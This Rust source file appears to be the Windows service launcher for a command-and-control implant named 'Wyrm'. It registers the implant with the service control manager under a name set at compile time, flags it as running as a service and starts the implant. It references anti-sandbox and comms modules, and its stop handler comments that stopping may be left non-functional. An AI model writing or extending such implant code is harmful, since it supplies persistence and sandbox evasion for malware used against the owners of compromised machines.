#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use std::sync::atomic::Ordering;

use entry::start_wyrm;
use windows_sys::{
    Win32::{
        Foundation::FALSE,
        System::Services::{
            RegisterServiceCtrlHandlerW, SERVICE_CONTROL_STOP, SERVICE_RUNNING,
            SERVICE_TABLE_ENTRYW, StartServiceCtrlDispatcherW,
        },
    },
    core::PWSTR,
};

use crate::{
    entry::IS_IMPLANT_SVC,
    utils::svc_controls::{SERVICE_HANDLE, SERVICE_STOP_EVENT, update_service_status},
};

mod anti_sandbox;
mod comms;
mod entry;
mod native;
mod utils;
mod wyrm;

/// Creates a service binary name, based on the malleable profile (or unwrap at comptime). The macro
/// returns a PWSTR (*mut u16) which can be used in place of a PWSTR in windows_sys
macro_rules! service_name_pwstr {
    () => {{
        let svc_name = option_env!("SVC_NAME").unwrap();
        let mut svc_name = svc_name.to_string();
        svc_name.push('\0');
        let mut svc_name_wide: Vec<u16> = svc_name.encode_utf16().collect();
        PWSTR::from(svc_name_wide.as_mut_ptr())
    }};
}

#[unsafe(no_mangle)]
pub unsafe extern "system" fn ServiceMain(_: u32, _: *mut PWSTR) {
    svc_start();
}

fn svc_start() {
    // register the service with SCM
    let h_svc =
        unsafe { RegisterServiceCtrlHandlerW(service_name_pwstr!(), Some(service_handler)) };
    if h_svc.is_null() {
        return;
    }

    IS_IMPLANT_SVC.store(true, Ordering::SeqCst);
    SERVICE_HANDLE.store(h_svc, Ordering::SeqCst);

    unsafe { update_service_status(h_svc, SERVICE_RUNNING) }

    start_wyrm();
}

unsafe extern "system" fn service_handler(control: u32) {
    match control {
        SERVICE_CONTROL_STOP => {
            // TODO, do we want actual stop control to work?
            SERVICE_STOP_EVENT.store(true, Ordering::SeqCst);
        }
        _ => {}
    }
}

fn main() {
    let service_table = [
        SERVICE_TABLE_ENTRYW {
            lpServiceName: service_name_pwstr!(),
            lpServiceProc: Some(ServiceMain),
        },
        SERVICE_TABLE_ENTRYW::default(),
    ];

    unsafe {
        if StartServiceCtrlDispatcherW(service_table.as_ptr()) == FALSE {
            return;
        }
    }
}
